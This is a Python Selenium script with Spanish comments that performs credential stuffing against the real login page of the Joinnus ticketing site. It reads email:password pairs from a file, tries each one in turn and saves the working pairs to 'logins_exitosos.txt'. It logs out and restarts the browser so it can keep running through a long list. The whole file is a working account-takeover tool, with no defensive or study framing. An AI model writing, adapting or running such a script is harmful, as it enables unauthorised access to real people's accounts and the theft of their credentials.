from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Ruta al archivo de credenciales
credenciales_file = "results.txt"
cookies_aceptadas = False  # Control para aceptar cookies solo la primera vez que se abre el navegador

# Función para iniciar el navegador y maximizar la ventana
def iniciar_navegador():
    global cookies_aceptadas
    driver = webdriver.Chrome()  # Asegúrate de que la ruta sea correcta
    driver.maximize_window()
    cookies_aceptadas = False  # Reiniciar el estado de cookies aceptadas cuando se inicia un nuevo navegador
    return driver

# Inicializamos el navegador
driver = iniciar_navegador()

# Archivo para guardar los logins exitosos
with open("logins_exitosos.txt", "w") as success_file:
    # Contador de logins exitosos para reiniciar el navegador cada cierto número
    login_count = 0

    # Leer cada línea del archivo de credenciales y probar el login
    with open(credenciales_file, "r") as file:
        for line in file:
            # Separar el correo y la contraseña de cada línea
            email, password = line.strip().split(':')

            # Verificar si el correo contiene "@" y continuar solo si es válido
            if "@" not in email:
                print(f"Email inválido sin '@': {email}. Saltando...")
                continue

            # Navegar a la página de login de Joinnus
            driver.get("https://www.joinnus.com/auth/login")

            # Esperar a que el campo de email esté presente y rellenarlo
            try:
                email_field = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Tu correo electrónico']"))
                )
                email_field.clear()
                email_field.send_keys(email)

                # Rellenar el campo de contraseña
                password_field = driver.find_element(By.XPATH, "//input[@placeholder='Ingresa 6 carácteres o más']")
                password_field.clear()
                password_field.send_keys(password)

                # Enviar el formulario
                password_field.send_keys(Keys.RETURN)
            except Exception as e:
                print(f"Error al ingresar credenciales para {email}: {e}")
                continue

            # Verificar el login o la aparición de un mensaje de error rápidamente
            try:
                # Esperar a que el login redirija fuera de la página de login o muestre un mensaje de error
                WebDriverWait(driver, 5).until(lambda d: "auth/login" not in d.current_url or d.find_element(By.CLASS_NAME, "text-danger"))

                # Caso 1: Si el login es exitoso y redirige
                if "auth/login" not in driver.current_url:
                    print(f"Resultado: Login exitoso para {email}")
                    login_count += 1
                    
                    # Guardar el login exitoso en el archivo
                    success_file.write(f"{email}:{password}\n")

                    # Aceptar cookies solo la primera vez que se abre el navegador
                    if not cookies_aceptadas:
                        try:
                            accept_cookies_button = WebDriverWait(driver, 3).until(
                                EC.element_to_be_clickable((By.XPATH, "//div[@class='dm_button' and text()='Aceptar']"))
                            )
                            accept_cookies_button.click()
                            cookies_aceptadas = True
                            print("Cookies aceptadas.")
                        except:
                            print("No fue necesario aceptar cookies.")

                    # Intentar cerrar sesión rápidamente si el usuario está logueado
                    for attempt in range(3):  # Intentamos hasta 3 veces
                        try:
                            profile_icon = WebDriverWait(driver, 3).until(
                                EC.presence_of_element_located((By.CLASS_NAME, "dropdown-user__link"))
                            )
                            actions = ActionChains(driver)
                            actions.move_to_element(profile_icon).perform()

                            # Hacer clic en "Cerrar sesión"
                            logout_button = WebDriverWait(driver, 3).until(
                                EC.element_to_be_clickable((By.XPATH, "//a[span[text()='Cerrar sesión']]"))
                            )
                            logout_button.click()
                            print(f"Cerrar sesión exitoso para {email}")
                            break  # Si cierra sesión con éxito, salimos del bucle
                        except Exception as e:
                            print(f"Intento {attempt+1} fallido al intentar cerrar sesión para {email}: {e}")
                            time.sleep(1)  # Espera breve antes de reintentar
                    else:
                        # Si no se pudo cerrar sesión en 3 intentos, reiniciar el navegador
                        print(f"No se pudo cerrar sesión para {email}. Reiniciando navegador para continuar.")
                        driver.quit()
                        driver = iniciar_navegador()  # Iniciar un nuevo navegador
                        continue  # Pasamos al siguiente usuario
                
                # Caso 2: Si aparece un mensaje de error como "user not found"
                else:
                    error_message = driver.find_element(By.CLASS_NAME, "text-danger").text
                    print(f"Resultado: {error_message} para {email}")
            
            except Exception as e:
                print(f"Error o timeout al verificar el login para {email}: {e}")

            # Reiniciar el navegador cada 10 logins exitosos para evitar acumulación de sesión
            if login_count >= 10:
                driver.quit()
                driver = iniciar_navegador()
                login_count = 0  # Reiniciar el contador

# Cerrar el navegador después de todas las pruebas
driver.quit()
